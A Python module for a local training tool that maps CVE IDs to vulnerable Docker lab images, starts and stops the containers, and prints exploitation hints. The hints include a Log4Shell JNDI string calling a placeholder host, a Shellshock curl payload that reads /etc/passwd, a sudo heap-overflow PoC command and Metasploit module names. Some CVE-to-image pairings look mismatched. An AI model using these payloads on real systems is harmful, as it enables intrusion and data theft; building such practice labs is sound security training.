"""
docker_manager.py
-----------------
Handles everything Docker-related for CVE-to-Lab Scaffolder.
- Finds a matching vulnerable image for a CVE
- Pulls the image from Docker Hub
- Spins up the container (the lab)
- Stops / removes the container when done

Requirements:
    pip install docker
    Docker Desktop must be running on Windows before using this.
"""

import docker
import docker.errors

# ── Known CVE → Docker image mapping ────────────────────────────────────────
# Format: "CVE-ID": { image, ports, notes, hints }
# ports format: { "container_port/tcp": host_port }
# We'll expand this list over time — this is your lab library!

CVE_LAB_MAP = {
    "CVE-2021-44228": {
        "image": "vulhub/log4j:2.14.1",
        "ports": {"8080/tcp": 8080},
        "notes": "Log4Shell — Apache Log4j2 RCE vulnerability (CVSS 10.0 CRITICAL)",
        "hints": [
            "The app logs user-agent headers — that's your injection point.",
            "Try sending: ${jndi:ldap://YOUR_IP:1389/exploit} in the User-Agent header.",
            "You'll need an LDAP server to catch the callback — try marshalsec or JNDI-Exploit-Kit.",
        ],
    },
    "CVE-2017-0144": {
        "image": "vulhub/samba:CVE-2017-7494",  # EternalBlue-style SMB lab
        "ports": {"445/tcp": 4450},  # Using 4450 to avoid conflict with host SMB
        "notes": "EternalBlue — SMB Remote Code Execution (CVSS 8.8 HIGH)",
        "hints": [
            "This targets the SMBv1 protocol — check if the service is running first.",
            "Try using Metasploit module: exploit/windows/smb/ms17_010_eternalblue",
            "Or manually with: nmap --script smb-vuln-ms17-010 <target>",
        ],
    },
    "CVE-2019-0708": {
        "image": "vulhub/bluekeep:CVE-2019-0708",
        "ports": {"3389/tcp": 3389},
        "notes": "BlueKeep — RDP Remote Code Execution (CVSS 9.8 CRITICAL)",
        "hints": [
            "This targets Windows RDP — scan port 3389 first.",
            "Metasploit module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "Check if the target is unpatched with: nmap -p 3389 --script rdp-vuln-ms12-020",
        ],
    },
    "CVE-2021-3156": {
        "image": "vulhub/sudo:CVE-2021-3156",
        "ports": {},  # No port needed — local privilege escalation
        "notes": "Baron Samedit — Sudo Heap Overflow LPE (CVSS 7.8 HIGH)",
        "hints": [
            "This is a local privilege escalation — you need shell access first.",
            "Check sudo version: sudo --version (vulnerable: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1)",
            "Try the PoC: sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')",
        ],
    },
    "CVE-2014-6271": {
        "image": "vulhub/bash:CVE-2014-6271",
        "ports": {"80/tcp": 8081},
        "notes": "Shellshock — Bash Environment Variable RCE (CVSS 9.8 CRITICAL)",
        "hints": [
            "Shellshock exploits how Bash processes environment variables.",
            "Target CGI scripts on the web server — try /cgi-bin/vulnerable.cgi",
            "Payload: curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://localhost:8081/cgi-bin/vulnerable",
        ],
    },
}


def get_docker_client():
    """
    Creates and returns a Docker client connected to Docker Desktop.
    Raises a clear error if Docker isn't running.
    """
    try:
        client = docker.from_env()
        client.ping()  # Test the connection
        return client
    except docker.errors.DockerException:
        raise ConnectionError(
            "\n[!] Cannot connect to Docker Desktop.\n"
            "    Make sure Docker Desktop is open and running on Windows,\n"
            "    then try again."
        )


def find_lab(cve_id: str) -> dict:
    """
    Looks up a CVE ID in our lab map.

    Args:
        cve_id (str): e.g. 'CVE-2021-44228'

    Returns:
        dict: Lab config (image, ports, notes, hints)

    Raises:
        ValueError: If no lab exists for this CVE yet
    """
    cve_id = cve_id.strip().upper()
    lab = CVE_LAB_MAP.get(cve_id)

    if not lab:
        supported = "\n  ".join(CVE_LAB_MAP.keys())
        raise ValueError(
            f"\n[!] No lab found for '{cve_id}'.\n"
            f"    Currently supported CVEs:\n  {supported}\n"
            f"    (More labs will be added — or you can add your own in docker_manager.py!)"
        )
    return lab


def pull_image(client, image: str) -> None:
    """
    Pulls a Docker image if not already present locally.

    Args:
        client: Docker client
        image (str): Image name e.g. 'vulhub/sudo:CVE-2021-3156'
    """
    YELLOW = "\033[93m"
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    RESET  = "\033[0m"

    try:
        client.images.get(image)
        print(f"{GREEN}[+] Image already pulled: {image}{RESET}")
    except docker.errors.ImageNotFound:
        print(f"{YELLOW}[~] Pulling image: {image} (this may take a minute...){RESET}")
        try:
            client.images.pull(image)
            print(f"{GREEN}[+] Image pulled successfully!{RESET}")
        except docker.errors.APIError as e:
            raise ConnectionError(
                f"\n{RED}[!] Failed to pull image: {image}\n"
                f"    Error: {e}\n"
                f"    Possible reasons:\n"
                f"      - No internet connection\n"
                f"      - Image no longer exists on registry\n"
                f"      - Registry requires login (try: docker pull {image})\n"
                f"    Try running manually: docker pull {image}{RESET}"
            )


def start_lab(cve_id: str) -> dict:
    """
    Main function — pulls the image and starts the lab container.

    Args:
        cve_id (str): e.g. 'CVE-2021-44228'

    Returns:
        dict: Info about the running lab:
            - container_id: Short container ID
            - cve_id: The CVE ID
            - image: Image used
            - ports: Port mappings
            - notes: What the vuln is
            - hints: How to start exploiting
    """
    CYAN  = "\033[96m"
    GREEN = "\033[92m"
    BOLD  = "\033[1m"
    RESET = "\033[0m"

    print(f"\n{CYAN}[*] Initializing lab for {cve_id}...{RESET}")

    client = get_docker_client()
    lab    = find_lab(cve_id)

    pull_image(client, lab["image"])

    print(f"{CYAN}[*] Starting container...{RESET}")

    # Build port bindings — only if the lab has ports
    port_bindings = lab["ports"] if lab["ports"] else {}

    container = client.containers.run(
        image    = lab["image"],
        detach   = True,           # Run in background
        ports    = port_bindings,
        name     = f"cvescaffold_{cve_id.replace('-', '_').lower()}",
        remove   = False,          # Keep it so we can stop it manually later
    )

    short_id = container.short_id

    print(f"\n{BOLD}{GREEN}{'='*50}")
    print(f"  [+] Lab is RUNNING!")
    print(f"{'='*50}{RESET}")
    print(f"  {BOLD}CVE       :{RESET} {cve_id}")
    print(f"  {BOLD}Container :{RESET} {short_id}")
    print(f"  {BOLD}Image     :{RESET} {lab['image']}")

    if lab["ports"]:
        print(f"  {BOLD}Access at :{RESET}")
        for container_port, host_port in lab["ports"].items():
            print(f"             http://localhost:{host_port}  ({container_port})")
    else:
        print(f"  {BOLD}Access    :{RESET} Local shell — exec into the container")
        print(f"             docker exec -it {short_id} /bin/bash")

    print(f"\n  {BOLD}Notes     :{RESET} {lab['notes']}")

    if lab["hints"]:
        print(f"\n  {BOLD}[i] Hints to get started:{RESET}")
        for i, hint in enumerate(lab["hints"], 1):
            print(f"     {i}. {hint}")

    print(f"{GREEN}{'='*50}{RESET}")
    print(f"\n  To stop the lab: python cli.py stop {cve_id}\n")

    return {
        "container_id": short_id,
        "cve_id":       cve_id,
        "image":        lab["image"],
        "ports":        lab["ports"],
        "notes":        lab["notes"],
        "hints":        lab["hints"],
    }


def stop_lab(cve_id: str) -> None:
    """
    Stops and removes the lab container for a given CVE.

    Args:
        cve_id (str): e.g. 'CVE-2021-44228'
    """
    RED   = "\033[91m"
    GREEN = "\033[92m"
    RESET = "\033[0m"

    container_name = f"cvescaffold_{cve_id.replace('-', '_').lower()}"
    client = get_docker_client()

    try:
        container = client.containers.get(container_name)
        print(f"{RED}[*] Stopping lab: {container_name}...{RESET}")
        container.stop()
        container.remove()
        print(f"{GREEN}[+] Lab stopped and removed.{RESET}")
    except docker.errors.NotFound:
        print(f"[!] No running lab found for {cve_id}.")


def list_labs() -> None:
    """
    Lists all currently running cvescaffold containers.
    """
    CYAN  = "\033[96m"
    BOLD  = "\033[1m"
    RESET = "\033[0m"

    client     = get_docker_client()
    containers = client.containers.list()
    labs       = [c for c in containers if c.name.startswith("cvescaffold_")]

    if not labs:
        print("\n[i] No labs currently running.\n")
        return

    print(f"\n{BOLD}{CYAN}Running Labs:{RESET}")
    for c in labs:
        print(f"  - {c.name}  [{c.short_id}]  status: {c.status}")
    print()


# ── Quick test ───────────────────────────────────────────────────────────────
# Run this file directly to test: python docker_manager.py
# WARNING: This will actually pull and start a Docker container!
# Make sure Docker Desktop is running first.
if __name__ == "__main__":
    # Test with Log4Shell — comment out stop_lab to keep it running
    CVE = "CVE-2021-44228"
    start_lab(CVE)

    input("\n  Press Enter to stop the lab...")
    stop_lab(CVE)